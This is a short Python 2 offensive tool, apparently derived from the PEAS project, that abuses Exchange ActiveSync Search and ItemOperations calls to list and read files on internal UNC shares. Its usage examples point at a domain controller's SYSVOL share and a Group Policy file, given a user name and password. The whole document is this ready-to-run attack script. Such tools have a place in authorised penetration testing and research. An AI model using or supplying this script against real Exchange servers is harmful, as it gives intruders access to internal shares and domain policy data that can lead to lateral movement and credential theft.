import requests
import base64
import sys

from wbxml import wbxml_parser
from as_code_pages import as_code_pages
from wapxml import wapxmltree, wapxmlnode
from Search import Search
from MSASHTTP import ASHTTPConnector
from ItemOperations import ItemOperations

parser = wbxml_parser(*as_code_pages.build_as_code_pages())

def get_unc_listing(ip, username, password, unc_path):
    try:

        cmd = 'Search'
        search_xmldoc_req = Search.build(unc_path, username=username, password=password)
        
        as_conn = ASHTTPConnector(ip)
        as_conn.set_credential(username, password)
        res = as_conn.post("Search", parser.encode(search_xmldoc_req))
        wapxml_res = parser.decode(res)
        filename = "get_unc_listing.txt"
        print('[+] Save response file to %s'%(filename))
        with open(filename, 'w+') as file_object:
            file_object.write(str(wapxml_res))
            
    except Exception as e:
            print('[!]Error:%s'%e)


def get_unc_file(ip, username, password, unc_path):
    try:
        as_conn = ASHTTPConnector(ip)
        as_conn.set_credential(username, password)

        operation = {'Name': 'Fetch', 'Store': 'DocumentLibrary', 'LinkId': unc_path}
        operation['UserName'] = username
        operation['Password'] = password
        operations = [operation]

        xmldoc_req = ItemOperations.build(operations)
        res = as_conn.post("ItemOperations", parser.encode(xmldoc_req))
        xmldoc_res = parser.decode(res)      
        responses = ItemOperations.parse(xmldoc_res)

        op, _, path, info, _ = responses[0]
        data = info['Data'].decode('base64')
        print data

    except Exception as e:
            print('[!]Error:%s'%e)
        
if __name__ == '__main__':
    if len(sys.argv)!=6:
        print('[!]Wrong parameter')
        print('easBrowseSharefile')       
        print('Use to browse the share file by eas(Exchange Server ActiveSync)')    
        print('Reference:')
        print('https://github.com/FSecureLABS/peas')        
        print('Usage:')
        print('%s <host> <user> <password> <mode> <path>'%(sys.argv[0]))
        print('Eg.')
        print('%s 192.168.1.1 user1 password1 listfile \\\\dc1\SYSVOL'%(sys.argv[0]))
        print('%s 192.168.1.1 user1 password1 readfile \\\\dc1\SYSVOL\test.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI'%(sys.argv[0]))        
        sys.exit(0)
    else:
        if sys.argv[4] == 'listfile': 
            get_unc_listing(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[5])
        elif sys.argv[4] == 'readfile': 
            get_unc_file(sys.argv[1], sys.argv[2], sys.argv[3],  sys.argv[5])
        else:
            print('[!]Wrong parameter')



    
